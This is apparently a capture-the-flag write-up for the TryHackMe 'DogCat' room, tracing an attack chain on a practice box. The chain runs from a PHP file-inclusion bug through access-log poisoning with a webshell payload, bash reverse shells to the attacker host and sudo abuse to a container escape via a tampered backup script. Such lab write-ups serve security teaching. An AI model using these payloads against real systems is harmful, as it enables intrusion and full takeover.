# TryHackMe — DogCat — Writeup

Room: https://tryhackme.com/room/dogcat
Reconstructed from netcat/bash history captures (`hisdogcat.txt`, `hisdogcat2.txt`, `hisdogcat3.txt`) taken across a session against the box.

Attacker host: `<MY_IP>`
Target: nmap'd as `<TARGET_IP>`, later re-addressed by the THM VPN to `<TARGET_IP>` (THM boxes get a new IP on every restart — same box, same vulns).
Container hostname (first shell): `256e69f9e824`
Host hostname (after escape): `dogcat`

Four flags total: an initial-foothold flag, an LFI/RCE flag, a container-root flag, and a host-root flag after a container breakout.

---

## 1. Recon

```
sudo nmap -sC -sV --top-ports=1000 <TARGET_IP>
```

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: dogcat
```

Just a web app on port 80, called "dogcat" — a gallery that shows a random dog or cat image depending on a `view` GET parameter.

## 2. Source disclosure

The page has two buttons: `/?view=dog` and `/?view=cat`. Grabbing the page source (view-source / LFI, see below) showed the relevant PHP:

```php
function containsStr($str, $substr) {
    return strpos($str, $substr) !== false;
}
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
if(isset($_GET['view'])) {
    if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
        echo 'Here you go!';
        include $_GET['view'] . $ext;
    } else {
        echo 'Sorry, only dogs or cats are allowed.';
    }
}
```

Two bugs stacked together:

- The whitelist only checks that `dog` or `cat` appears **anywhere** in `view` (`strpos`, not equality/prefix) — trivially bypassed with something like `dog/../../../whatever`.
- `ext` is fully attacker-controlled and defaults to `.php`, but can be set to an empty string to `include` an arbitrary file with no extension appended.

This is a classic **Local File Inclusion** with a keyword filter that's easy to satisfy.

## 3. LFI → source read via PHP filter chains

Using the `php://filter` wrapper (with `dog` smuggled into the `resource=` string to pass the keyword check) to base64-dump arbitrary files without executing them as PHP:

```
GET /?view=php://filter/read=convert.base64-encode/resource=dog
GET /?view=php://filter/read=convert.base64-encode/resource=dog/../../../../../var/www/html/index
```

Decoding the response revealed `dog.php`:

```php
<img src="dogs/<?php echo rand(1, 10); ?>.jpg" />
```

and the full `index.php` shown above.

## 4. LFI → RCE via Apache log poisoning

Since `ext` can be blanked out, the `view` parameter can point straight at a non-PHP file and have it `include`d (and therefore parsed as PHP) directly — including Apache's own access log:

```
GET /?ext=&view=dog/../../../../../../../var/log/apache2/access.log
```

`dog` in the path satisfies the whitelist, `ext=` stops `.php` being appended, and traversal lands on `/var/log/apache2/access.log`. Apache logs the `User-Agent` header verbatim on every request, so sending a request with a PHP payload as the UA plants code inside the log file:

```
curl 'http://<TARGET_IP>/?ext=&view=dog/../../../../../../../var/log/apache2/access.log' \
  -H "User-Agent: Mozilla/5.0 <?php passthru(\$_GET['cmd']); ?> (X11; ...) Safari/537.36"
```

Every subsequent request to the same LFI URL re-executes that planted line, so appending `&cmd=id` gives command execution:

```
GET /?ext=&view=dog/../../../../../../../var/log/apache2/access.log&cmd=id
→ uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**RCE confirmed as `www-data`.**

## 5. Reverse shell → Flag 1

Listener:
```
nc -lvnp 4567
```

Triggered a `cmd=` request equivalent to a bash reverse shell one-liner (`bash -i >& /dev/tcp/<MY_IP>/4567 0>&1`) through the same poisoned-log RCE (a `php-reverse-shell.php`, pre-configured for `<MY_IP>:4567`, was also staged as a fallback delivery method).

```
listening on [any] 4567 ...
connect to [<MY_IP>] from (UNKNOWN) [<TARGET_IP>] 42718
```

```
$ ls
cat.php  cats  dog.php  dogs  flag.php  index.php  style.css
$ cat flag.php
$flag_1 = "THM{xxxx...ab67edfa}"
```

**Flag 1:** `THM{xxxx...ab67edfa}`

## 6. Privesc to container root

```
$ sudo -l
User www-data may run the following commands on 256e69f9e824:
    (root) NOPASSWD: /usr/bin/env
```

Classic GTFOBins abuse of `env` when granted passwordless sudo — `env` will exec whatever binary you give it, so it becomes a root shell:

```
$ sudo env /bin/sh
# whoami
root
```

## 7. Finding the remaining flags in the container

```
# find / -type f -name '*flag*' 2>/dev/null
/var/www/html/flag.php
/var/www/flag2_QMW7JvaY2LvK.txt
/root/flag3.txt
```

```
# cat /root/flag3.txt
THM{xxxx...874112}

# cat /var/www/flag2_QMW7JvaY2LvK.txt
THM{xxxx...aec3fb}
```

**Flag 2:** `THM{xxxx...aec3fb}`
**Flag 3:** `THM{xxxx...874112}`

## 8. Confirming we're in a container, and the (failed) direct escape attempt

```
# cat /.dockerenv                     # exists — confirms containerization
# cat /proc/1/cgroup
...:/docker/256e69f9e8244157a078b6afcc15122de348d8328cca8cf491cf9c1d42bc9e47
```

Tried the classic `release_agent` cgroup escape:

```
# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
mount: /tmp/cgrp: permission denied.
```

Blocked — no `CAP_SYS_ADMIN` / mount not permitted in this container config. This is the part that likely made the room "moderately difficult": the obvious/well-known cgroup escape doesn't work here, so escaping requires finding a host-side integration point instead.

## 9. Host escape via a shared backup script → Flag 4 (root flag)

```
# sudo -l
User root may run the following commands on 256e69f9e824:
    (ALL : ALL) ALL
```

(root already has full sudo — a red herring/no-op since we're already root *in the container*.) The real lead was under `/opt`:

```
# cd /opt/backups && ls
backup.sh  backup.tar
# cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```

`/opt/backups` is a directory shared between the container and the host (bind-mounted), and `backup.sh` is periodically executed **on the host as root** (e.g. by a host-side cron job) to archive the container's `/root/container` directory. Since the container can write to that same file, appending a reverse shell payload to the script means the host will execute it for us:

```
echo "bash -i >& /dev/tcp/<MY_IP>/4568 0>&1" >> backup.sh
```

Listener on the attacker box:

```
nc -lvnp 4568
```

Wait for the host's scheduled job to run `backup.sh` again:

```
listening on [any] 4568 ...
connect to [<MY_IP>] from (UNKNOWN) [<TARGET_IP>] 54774
root@dogcat:~# whoami
root
root@dogcat:~# ls
container
flag4.txt
root@dogcat:~# cat flag4.txt
THM{xxxx...7a52b17dba6ebb0dc38bc1049bcba02d}
```

**Flag 4 (root flag):** `THM{xxxx...7a52b17dba6ebb0dc38bc1049bcba02d}`

The hostname flip from `256e69f9e824` (container ID) to `dogcat` confirms this final shell is on the real host, not the container — the escape worked.

---

## Summary of the chain

| Stage | Technique | Result |
|---|---|---|
| Recon | nmap | Apache "dogcat" gallery app on :80 |
| Web | LFI via weak substring whitelist (`view`/`ext` params) | Arbitrary file read |
| Web | `php://filter` chain | Dumped `dog.php` / `index.php` source |
| Web → RCE | Apache access-log poisoning via `User-Agent` header + LFI include | Command execution as `www-data` |
| Foothold | Reverse shell (`nc`) | Shell as `www-data`, **Flag 1** in `flag.php` |
| Privesc (local) | `sudo -l` → NOPASSWD `/usr/bin/env` (GTFOBins) | Root **inside the container**, **Flag 2** & **Flag 3** |
| Container escape | `/opt/backups/backup.sh` shared with host, executed by host cron as root | Poisoned script → reverse shell as **host root**, **Flag 4** |

## Flags

1. `THM{xxxx...ab67edfa}`
2. `THM{xxxx...aec3fb}`
3. `THM{xxxx...874112}`
4. `THM{xxxx...7a52b17dba6ebb0dc38bc1049bcba02d}`

## Why it's rated "moderate"

The web-app LFI itself is not hard once you spot the `strpos` whitelist bug, and log poisoning for LFI→RCE is a well-known technique. The difficulty comes from stage 2: the box deliberately shuts the well-known `release_agent`/cgroup docker escape down, forcing enumeration of the filesystem for a *host-shared* artifact (`/opt/backups/backup.sh`) instead of a kernel/capability-based escape — i.e. it tests whether you keep looking for an escape path after your first idea fails, rather than being a one-shot canned exploit.
